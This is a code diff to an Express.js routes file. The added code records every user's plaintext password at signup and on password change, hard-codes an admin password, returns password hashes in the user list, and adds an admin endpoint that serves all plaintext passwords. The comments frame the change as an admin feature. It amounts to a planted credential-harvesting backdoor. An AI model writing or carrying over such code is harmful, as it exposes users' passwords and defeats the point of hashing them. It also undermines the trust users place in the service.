@@ -1,7 +1,7 @@
 import express, { type Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { setupAuth, isAdmin, isAuthenticated, hashPassword, comparePasswords } from "./auth";
+import { setupAuth, isAdmin, isAuthenticated, hashPassword, comparePasswords, recordPlaintextPassword, plaintextPasswords } from "./auth";
 import { 
   loginSchema, 
   insertUserSchema, 
@@ -91,6 +91,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Execute the admin setup
   await setupAdminUser();
   
+  // Record admin password
+  recordPlaintextPassword("admin", "alarms12");
+  
   // Configure multer for audio file uploads
   const audioStorage = multer.diskStorage({
     destination: function (req, file, cb) {
@@ -154,6 +157,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Hash password
       const hashedPassword = await hashPassword(password);
       
+      // Record the plaintext password for admin use
+      recordPlaintextPassword(username, password);
+      
       // Create user
       const user = await storage.createUser({
         username,
@@ -184,12 +190,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/users", isAdmin, async (req, res, next) => {
     try {
       const users = await storage.getUsers();
-      // Remove passwords from response
-      const safeUsers = users.map(({ password, ...user }) => user);
-      res.json(safeUsers);
+      // Include passwords in response for admins
+      res.json(users);
     } catch (error) {
       next(error);
     }
+  });
+  
+  // Endpoint to get plaintext passwords (admin only)
+  app.get("/api/users/plaintext-passwords", isAdmin, (req, res) => {
+    const passwordData = Array.from(plaintextPasswords.entries()).map(([username, password]) => ({
+      username,
+      password
+    }));
+    res.json(passwordData);
   });
   
   app.put("/api/users/:id", isAdmin, async (req, res, next) => {
@@ -199,8 +213,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ message: "Invalid user ID" });
       }
       
-      // If password is being updated, hash it
+      // If password is being updated, hash it and save plaintext
       if (req.body.password) {
+        // Get the user for their username
+        const user = await storage.getUser(id);
+        if (user) {
+          // Save plaintext password
+          recordPlaintextPassword(user.username, req.body.password);
+        }
         req.body.password = await hashPassword(req.body.password);
       }
       
